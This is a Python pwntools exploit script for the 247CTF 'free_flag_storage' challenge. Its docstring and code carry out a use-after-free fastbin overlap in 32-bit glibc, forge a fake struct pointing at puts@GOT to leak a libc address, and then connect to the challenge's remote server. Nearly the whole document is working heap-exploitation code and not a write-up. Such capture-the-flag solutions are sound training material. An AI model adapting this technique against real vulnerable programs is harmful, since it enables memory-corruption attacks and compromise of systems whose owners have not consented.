#!/usr/bin/env python3
"""
UAF Exploit v5 - Different allocation sizes for struct/value overlap

Key insight from glibc 32-bit:
- struct (16 bytes user) -> 24-byte chunk
- value 8 bytes -> 16-byte chunk (different fastbin!)
- value 16 bytes -> 24-byte chunk (same fastbin as struct!)

Strategy:
1. Create flag0(8b), flag1(8b) - structs in fastbin-24, values in fastbin-16
2. Delete both - structs go to one fastbin, values to another
3. Add flag2(16b) - struct from fastbin-24, value ALSO from fastbin-24!
   This makes value2 = old struct location!
4. flags[0] (dangling) -> struct0 = value2's buffer
5. Write fake struct as value2's data -> controls what flags[0] reads as struct
6. Fake struct has value_ptr = GOT -> leak libc address!
"""
from pwn import *

context.binary = elf = ELF('./free_flag_storage')
context.log_level = 'info'

puts_got = 0x804b028
atoi_got = 0x804b034

def start():
    if args.REMOTE:
        return remote('de22d451a7a11cba.247ctf.com', 50413)
    return process('./free_flag_storage')

p = start()

def send3(s):
    p.send(str(s).encode().ljust(3, b'\n'))

def add(length, value, cid, score):
    p.sendline(b'add')
    p.recvuntil(b'length:'); send3(length)
    p.recvuntil(b'value:'); p.send(value.ljust(length, b'\x00')[:length])
    p.recvuntil(b'challenge_id:'); send3(cid)
    p.recvuntil(b'score:'); send3(score)
    p.recvuntil(b'Enter command:')

def edit(idx, value, length, cid=99, score=99):
    p.sendline(b'edit')
    p.recvuntil(b'edit:'); send3(idx)
    p.recvuntil(b'):'); p.send(value.ljust(length, b'\x00')[:length])
    p.recvuntil(b'challenge_id:'); send3(cid)
    p.recvuntil(b'score:'); send3(score)
    p.recvuntil(b'Enter command:')

def delete(idx):
    p.sendline(b'delete')
    p.recvuntil(b'delete:'); send3(idx)
    p.recvuntil(b'Enter command:')

def show():
    p.sendline(b'print')
    return p.recvuntil(b'Enter command:', drop=True)

p.recvuntil(b'Enter command:')

log.info("Step 1: Create flags with 8-byte values (different fastbin than struct)")
add(8, b'AAAAAAAA', 1, 11)  # flag0: struct0(24b), value0(16b)
add(8, b'BBBBBBBB', 2, 22)  # flag1: struct1(24b), value1(16b)
log.info(show().decode())

log.info("Step 2: Delete flag1 then flag0")
log.info("  fastbin-24: struct0 -> struct1")
log.info("  fastbin-16: value0 -> value1")
delete(1)
delete(0)

log.info("Step 3: Add flag2 with 16-byte value (= fake struct)")
log.info("  malloc(struct2) = struct0 from fastbin-24")
log.info("  malloc(value2)  = struct1 from fastbin-24 (NOT value fastbin!)")
log.info("  So value2 buffer = struct1 location")
log.info("  And flags[1] (dangling) -> struct1 = value2 = our fake struct!")

# Fake struct: length=4, value_ptr=puts@GOT, cid, score
# length=4 is enough to read 4 bytes (libc address)
fake_struct = p32(4) + p32(puts_got) + p32(0xcafe) + p32(0xbabe)
add(16, fake_struct, 3, 33)

log.info("Step 4: Show - flag1 (dangling->struct1=value2) should leak puts@GOT")
data = show()
log.info(f"Raw: {data}")

# Parse the output for leaked address
# flags[1] should read fake struct with value_ptr=puts@GOT
# and print the 4 bytes at puts@GOT as the "flag value"
for line in data.split(b'\n'):
    if b'challenge_id: 51966' in line or b'cafe' in line.lower():  # 0xcafe = 51966
        log.success(f"Found our fake struct entry: {line}")
        # Extract the value between 247CTF{ and }
        start = line.find(b'{')
        end = line.find(b'}')
        if start != -1 and end != -1:
            leak_data = line[start+1:end]
            log.info(f"Leaked bytes: {leak_data.hex() if leak_data else 'empty'}")
            if len(leak_data) >= 4:
                puts_addr = u32(leak_data[:4])
                log.success(f"puts@libc = {hex(puts_addr)}")

p.interactive()
